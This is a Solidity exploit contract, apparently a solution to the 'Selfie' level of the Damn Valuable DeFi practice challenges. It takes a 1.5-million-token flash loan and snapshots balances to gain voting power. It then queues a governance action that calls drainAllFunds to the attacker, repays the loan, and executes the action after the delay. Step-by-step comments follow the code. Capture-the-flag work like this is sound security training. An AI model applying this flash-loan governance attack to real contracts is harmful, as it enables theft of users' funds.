// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableTokenSnapshot.sol";
interface ISelfiePool{
    function flashLoan(uint256 borrowAmount) external;
    function drainAllFunds(address receiver) external;
}
interface ISimpleGovernance{
    function queueAction(address receiver, bytes calldata data, uint256 weiAmount) external returns (uint256);
    function executeAction(uint256 actionId) external payable;
}
contract AttackContract{

    ISelfiePool selfiePool;
    ISimpleGovernance governance;
    address attacker;
    uint actionId;

    constructor(address _pool, address _governance,address _attacker) {
        selfiePool = ISelfiePool(_pool);
        governance = ISimpleGovernance(_governance);
        attacker = _attacker;
    }
    function firstAttack() external{
        selfiePool.flashLoan(1500000 ether);
    }

    function receiveTokens(address token, uint256 amount) external{
        DamnValuableTokenSnapshot(token).snapshot();
        actionId = governance.queueAction(address(selfiePool),abi.encodeWithSignature('drainAllFunds(address)', attacker) , 0);
        DamnValuableTokenSnapshot(token).transfer(address(selfiePool),amount);
    }

    function secondAttack() external{
        governance.executeAction(actionId);
        
    }
}

// flashloan(1.5 million)
// snapshot()
// return amount to flashLoan()
// actionId = queueAction(SefliePool,drainAllFunds(attacker),0);

// wait for 2 days

// executeAction(actionId)